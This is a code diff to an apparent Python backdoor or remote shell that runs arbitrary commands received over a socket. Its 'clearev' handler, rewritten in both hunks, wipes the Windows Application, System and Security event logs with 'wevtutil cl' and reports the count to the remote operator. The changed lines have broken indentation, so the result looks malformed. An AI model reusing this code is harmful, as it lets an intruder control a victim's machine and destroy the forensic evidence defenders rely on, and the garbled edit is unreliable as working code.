@@ -172,14 +172,14 @@ def shell(client_socket):
 
             elif command.lower() == "clearev":
                 try:
-                    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
-                    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
-                    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
-                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\\\n')} records from Application...\n".encode('utf-8')))
-client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\\\\n')} records from System...\n".encode('utf-8')))
-client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\\\\n')} records from Security...\n".encode('utf-8')))
-                except Exception as e:
-                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
+    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
+    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
+    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\\\n')} records from Application...\n".encode('utf-8')))
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\\\\n')} records from System...\n".encode('utf-8')))
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\\\\n')} records from Security...\n".encode('utf-8')))
+except Exception as e:
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
             else:
                 output = subprocess.run(command, shell=True, capture_output=True, text=True)
                 client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, output.stdout.encode('utf-8') or b"Command executed, but no output."))
@@ -346,15 +346,15 @@ def main():
                     client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
                     print(f"[*] Error: {e}")
             elif command == "clearev":
-                try:
-                    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
-                    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
-                    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
-                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\\\n')} records from Application...\n".encode('utf-8')))
-client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\\\\n')} records from System...\n".encode('utf-8')))
-client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\\\\n')} records from Security...\n".encode('utf-8')))
-                except Exception as e:
-                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
+            try:
+    application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
+    system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
+    security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\\\n')} records from Application...\n".encode('utf-8')))
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\\\\n')} records from System...\n".encode('utf-8')))
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\\\\n')} records from Security...\n".encode('utf-8')))
+except Exception as e:
+    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"Error: {e}\n".encode('utf-8')))
         except Exception as e:
             print(f"Error: {e}")
             break
